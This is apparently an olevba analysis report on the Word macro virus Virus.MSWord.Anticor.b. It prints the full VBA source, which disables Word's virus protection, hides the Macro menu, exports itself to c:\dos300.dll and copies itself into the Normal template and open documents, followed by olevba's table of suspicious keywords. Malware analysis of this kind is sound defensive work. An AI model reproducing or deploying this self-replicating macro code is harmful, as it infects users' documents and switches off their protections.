olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Anticor.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Anticor.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO ThisDocument1.cls 
in file: Virus.MSWord.Anticor.b - OLE stream: 'Macros/VBA/ThisDocument1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Private Sub Document_Close()
On Error Resume Next
With Options
.VirusProtection = False
.ConfirmConversions = False
.SaveNormalPrompt = False
End With
If System.ProfileString("HKEY_LOCAL_MACHINE/Software/Microsoft/Office/", "AntiCor") <> "AntiCor" Then
GoTo SaberI
End If
SaberI:
ThisDocument.VBProject.VBComponents(1).Export ("c:\dos300.dll")
If CommandBars("Tools").Controls("Macro").Visible = True Then
Set this = ThisDocument.VBProject.VBComponents(1).CodeModule
Set x = NormalTemplate.VBProject
Set x2 = x.VBComponents(1).CodeModule
End If
Set y = ActiveDocument.VBProject
Set y2 = y.VBComponents(1).CodeModule
CommandBars("Tools").Controls("Macro").Visible = False
Set alin = y2.CountOfLines
Set nlin = x2.CountOfLines
If nlin < this.CountOfLines Then
 x2.AddFromFile ("c:\dos300.dll")
 x2.deletelines 1, 4
Else
If alin < this.CountOfLines Then
y2.AddFromFile ("c:\dos300.dll")
y2.deletelines 1, 4
End If
End If
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE/Software/Microsoft/Office/", "AntiCor") = "AntiCor"
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |dos300.dll          |Executable file name                         |
+----------+--------------------+---------------------------------------------+

